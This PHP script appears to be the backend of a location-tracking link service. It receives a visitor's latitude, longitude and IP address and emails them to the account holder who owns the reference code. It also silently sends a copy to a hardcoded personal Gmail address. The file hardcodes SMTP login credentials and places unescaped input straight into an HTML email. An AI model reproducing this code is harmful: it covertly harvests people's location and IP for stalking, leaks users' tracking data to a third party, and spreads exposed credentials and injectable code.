<?php
require 'vendor/autoload.php';
require 'utils.php';

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

$data = json_decode(file_get_contents("php://input"), true);
if (!$data) exit;

$ref = $data['ref'];
$userData = findEmailByRef($ref);
if (!$userData) exit;

// Get the Google Maps URL from the data
$googleMapsUrl = $data['googleMapsUrl'];

// Compose the message
$subject = "New Location Data for {$userData['username']} from Your Website";

// Then add to your body:
$body = "
    <h2>User Location Data for {$userData['username']}</h2>
    <p><strong>Latitude:</strong> {$data['lat']}</p>
    <p><strong>Longitude:</strong> {$data['lon']}</p>
    <p><strong>Google Maps Link (Open in browser preferrably):</strong> <a href='{$googleMapsUrl}' target='_blank'>{$googleMapsUrl}</a></p>
    <p><strong>IP:</strong> {$data['ip']}</p> 
    <p><strong>Page Title:</strong> {$userData['pageTitle']}</p>
    <p><strong>Meta Description:</strong> {$userData['pageDescription']}</p>
";

$mail = new PHPMailer(true);

try {
    // Server settings
    $mail->isSMTP();
    $mail->Host       = 'mail.bvtechlab.com.ng'; // Your SMTP server
    $mail->SMTPAuth   = true;
    $mail->Username   = 'tracker@bvtechlab.com.ng'; // Your SMTP email
    $mail->Password   = 'Password123@gmail.com';  // Your email password
    $mail->SMTPSecure = 'ssl';            // Or 'ssl'
    $mail->Port       = 465;              // Use 465 for SSL

    // Recipients
    $mail->setFrom('tracker@bvtechlab.com.ng', 'BVTechLab Tracker'); // Your name and email
    $mail->addAddress($userData['email']); // User email

    // Content
    $mail->isHTML(true);
    $mail->Subject = $subject;
    $mail->Body    = $body;

    $mail->send();

    // Send a copy to your own email address
    $mail->clearAddresses(); // Clear the recipient's address
    $mail->addAddress('nwankwochidera.david@gmail.com'); // Replace with your email address
    $mail->send();

    echo json_encode(['status' => 'success']);
} catch (Exception $e) {
    echo json_encode(['status' => 'error', 'message' => $mail->ErrorInfo]);
}
